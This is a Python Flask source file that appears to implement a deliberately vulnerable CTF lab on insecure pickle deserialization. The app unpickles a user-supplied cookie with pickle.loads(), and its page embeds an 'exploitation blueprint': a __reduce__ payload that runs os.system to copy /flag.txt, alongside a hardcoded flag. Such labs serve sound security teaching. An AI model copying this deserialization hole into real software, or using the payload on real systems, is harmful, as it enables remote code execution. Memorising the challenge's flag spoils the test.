from flask import Flask, request, make_response, render_template_string, redirect, url_for
import os
import pickle
import base64

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "CTF{p1ckl3_d353r14l1z4t10n_rc3_pwn4g3_9941}")

# Ensure flag file exists for RCE reading
with open("/flag.txt", "w") as f:
    f.write(FLAG + "\n")

class UserPreferences:
    def __init__(self, username="Analyst_Guest", theme="dark", role="Standard User", bio="Cybersecurity researcher exploring serialization vulnerabilities."):
        self.username = username
        self.theme = theme
        self.role = role
        self.bio = bio

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PickleVault // Insecure Deserialization Lab</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0b0f19;
            --card: #131c31;
            --border: #23304c;
            --accent: #ec4899;
            --accent-glow: rgba(236, 72, 153, 0.25);
            --text: #f8fafc;
            --text-dim: #94a3b8;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            background: rgba(19, 28, 49, 0.95);
            border-bottom: 1px solid var(--border);
            padding: 1.25rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .brand {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.2rem;
            font-weight: 800;
            color: var(--accent);
        }
        .container {
            max-width: 960px;
            margin: 2rem auto;
            padding: 0 1rem;
            flex: 1;
            width: 100%;
        }
        .banner {
            background: linear-gradient(135deg, rgba(236, 72, 153, 0.1), rgba(157, 23, 77, 0.05));
            border: 1px solid var(--accent);
            padding: 1rem 1.5rem;
            border-radius: 10px;
            margin-bottom: 2rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            line-height: 1.5;
        }
        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 1.75rem;
            margin-bottom: 1.5rem;
            box-shadow: 0 10px 30px -5px rgba(0, 0, 0, 0.5);
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1.5rem;
        }
        label {
            display: block;
            font-size: 0.8rem;
            font-weight: 600;
            color: var(--text-dim);
            margin-bottom: 0.4rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        input, textarea, select {
            width: 100%;
            background: #070a13;
            border: 1px solid var(--border);
            border-radius: 8px;
            color: #38bdf8;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            padding: 0.75rem;
            margin-bottom: 1rem;
        }
        input:focus, textarea:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
        button {
            background: var(--accent);
            color: #fff;
            font-weight: 700;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px var(--accent-glow); }
        .code-preview {
            background: #04060d;
            border: 1px solid #1a233a;
            border-radius: 8px;
            padding: 1rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: #f472b6;
            word-break: break-all;
            white-space: pre-wrap;
        }
        .exploit-helper {
            background: #090e1a;
            border: 1px dashed var(--border);
            border-radius: 8px;
            padding: 1.25rem;
            margin-top: 1rem;
            font-size: 0.8rem;
            color: var(--text-dim);
            font-family: 'JetBrains Mono', monospace;
        }
        footer {
            text-align: center;
            padding: 1.5rem;
            color: var(--text-dim);
            font-size: 0.8rem;
            border-top: 1px solid var(--border);
        }
    </style>
</head>
<body>
    <header>
        <div class="brand">📦 PICKLEVAULT // INSECURE DESERIALIZATION</div>
        <div style="font-size: 0.85rem; color: var(--text-dim); font-family: 'JetBrains Mono', monospace;">OWASP A08: Software and Data Integrity Failures</div>
    </header>

    <div class="container">
        <div class="banner">
            🎯 <strong>MISSION:</strong> The user session cookie (<code>user_pref</code>) contains a Base64-encoded Python <code>pickle</code> object that is deserialized directly on the backend via <code>pickle.loads()</code>.<br>
            Construct a Python <code>__reduce__</code> payload to achieve Remote Code Execution (RCE) and extract <code>/flag.txt</code>!
        </div>

        <div class="grid">
            <!-- Active Profile -->
            <div class="card">
                <h3 style="margin-bottom: 1rem; color: #fff;">👤 Current Deserialized Profile</h3>
                <div style="margin-bottom: 1rem;">
                    <label>Username</label>
                    <div style="font-size: 1.1rem; font-weight: 700; color: #38bdf8;">{{ pref.username }}</div>
                </div>
                <div style="margin-bottom: 1rem;">
                    <label>Assigned Role</label>
                    <span style="background: #1e1b4b; color: #818cf8; padding: 0.25rem 0.6rem; border-radius: 4px; font-size: 0.8rem; font-family: 'JetBrains Mono', monospace;">{{ pref.role }}</span>
                </div>
                <div style="margin-bottom: 1rem;">
                    <label>User Bio / Status</label>
                    <p style="color: var(--text-dim); font-size: 0.85rem;">{{ pref.bio }}</p>
                </div>
                <div>
                    <label>Active Cookie (Base64 Pickle)</label>
                    <div class="code-preview">{{ raw_cookie }}</div>
                </div>
            </div>

            <!-- Profile Editor -->
            <div class="card">
                <h3 style="margin-bottom: 1rem; color: #fff;">⚙️ Update Profile State</h3>
                <form method="POST" action="/update">
                    <label>Username</label>
                    <input type="text" name="username" value="{{ pref.username }}" required>
                    
                    <label>Bio</label>
                    <textarea name="bio" rows="3">{{ pref.bio }}</textarea>
                    
                    <button type="submit">Serialize & Save Cookie 💾</button>
                </form>

                <hr style="border-color: var(--border); margin: 1.5rem 0;">

                <h4 style="margin-bottom: 0.5rem; color: #fff;">Direct Cookie Injector</h4>
                <form method="POST" action="/inject-cookie">
                    <label>Custom Base64 Pickle Payload</label>
                    <textarea name="custom_cookie" rows="3" placeholder="Paste custom Base64 pickled exploit string here..."></textarea>
                    <button type="submit" style="background: #3b82f6;">Inject Payload 🚀</button>
                </form>
            </div>
        </div>

        <div class="exploit-helper">
            <strong>💡 Exploitation Blueprint (Python 3):</strong>
            <pre style="color: #cbd5e1; margin-top: 0.5rem;">
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        # Command executed upon unpickling
        cmd = "cat /flag.txt > /tmp/flag_out.txt"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print("Payload:", payload)
            </pre>
        </div>
    </div>

    <footer>
        CyberSec Range • Insecure Python Object Deserialization CTF Challenge
    </footer>
</body>
</html>
"""

@app.route('/')
def index():
    cookie = request.cookies.get('user_pref')
    if not cookie:
        # Generate default session
        default_pref = UserPreferences()
        raw_b64 = base64.b64encode(pickle.dumps(default_pref)).decode('utf-8')
        resp = make_response(render_template_string(HTML_TEMPLATE, pref=default_pref, raw_cookie=raw_b64))
        resp.set_cookie('user_pref', raw_b64)
        return resp

    try:
        # VULNERABILITY: Untrusted deserialization with pickle.loads()
        decoded = base64.b64decode(cookie)
        pref_obj = pickle.loads(decoded)
        
        # In case the payload returns non-UserPreferences object or string
        if not hasattr(pref_obj, 'username'):
            class Fallback:
                def __init__(self, val):
                    self.username = "Exploit Executed"
                    self.role = "ROOT / RCE"
                    self.bio = f"Execution Result / Object: {str(val)}"
            pref_obj = Fallback(pref_obj)

        return render_template_string(HTML_TEMPLATE, pref=pref_obj, raw_cookie=cookie)
    except Exception as e:
        class ErrorObj:
            def __init__(self, err):
                self.username = "Deserialization Error"
                self.role = "N/A"
                self.bio = f"Error during unpickling: {str(err)}"
        return render_template_string(HTML_TEMPLATE, pref=ErrorObj(e), raw_cookie=cookie)

@app.route('/update', methods=['POST'])
def update_profile():
    username = request.form.get('username', 'Analyst')
    bio = request.form.get('bio', '')
    
    new_pref = UserPreferences(username=username, bio=bio)
    raw_b64 = base64.b64encode(pickle.dumps(new_pref)).decode('utf-8')
    
    resp = redirect(url_for('index'))
    resp.set_cookie('user_pref', raw_b64)
    return resp

@app.route('/inject-cookie', methods=['POST'])
def inject_cookie():
    custom_cookie = request.form.get('custom_cookie', '').strip()
    resp = redirect(url_for('index'))
    if custom_cookie:
        resp.set_cookie('user_pref', custom_cookie)
    return resp

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
